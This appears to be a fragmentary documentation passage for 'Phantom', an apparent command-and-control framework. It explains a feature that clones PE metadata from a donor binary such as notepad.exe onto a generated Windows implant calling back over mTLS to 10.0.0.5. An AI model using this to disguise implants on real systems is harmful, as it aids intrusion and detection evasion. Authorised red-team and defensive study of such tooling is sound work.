...
- Default client app dir: `~/.phantom-client`

On first client startup, Phantom creates `spoof-metadata.yaml` if it does not exist.
...
When path mode is used, Phantom only uses the donor file bytes as `pe.source` and does not read override fields from `spoof-metadata.yaml`.

## Quick Start

1. Start the client once to generate `~/.phantom-client/spoof-metadata.yaml`.
...
```bash
phantom > generate --os windows --arch amd64 --format exe --mtls 10.0.0.5 --spoof-metadata -N win-agent
```

Direct donor path example:

```bash
phantom > generate --os windows --arch amd64 --format exe --mtls 10.0.0.5 --spoof-metadata /opt/samples/notepad.exe -N win-agent
```
...
If `path` is set and `name` is omitted, Phantom uses `basename(path)` automatically.
...
1. Phantom clones metadata/resources from `pe.source`.
2. Phantom applies explicit override fields from your config.
